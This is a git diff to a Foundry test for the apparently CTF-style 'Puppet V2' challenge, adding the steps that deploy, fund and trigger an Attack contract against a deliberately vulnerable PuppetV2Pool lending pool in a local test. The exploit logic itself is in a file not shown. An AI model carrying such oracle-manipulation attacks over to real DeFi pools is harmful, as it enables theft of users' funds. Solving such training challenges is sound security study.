@@ -10,6 +10,7 @@ import {WETH9} from "../../../src/Contracts/WETH9.sol";
 import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
 
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
+import {Attack} from "../../../src/Contracts/puppet-v2/Attack.sol";
 
 contract PuppetV2 is Test {
     // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
@@ -103,7 +104,12 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Attack attack =
+            new Attack(address(puppetV2Pool), address(uniswapV2Router), address(dvt), address(weth), attacker);
+        dvt.transfer(address(attack), ATTACKER_INITIAL_TOKEN_BALANCE);
+        payable(address(attack)).transfer(attacker.balance);
+        attack.attack();
         /**
          * EXPLOIT END *
          */
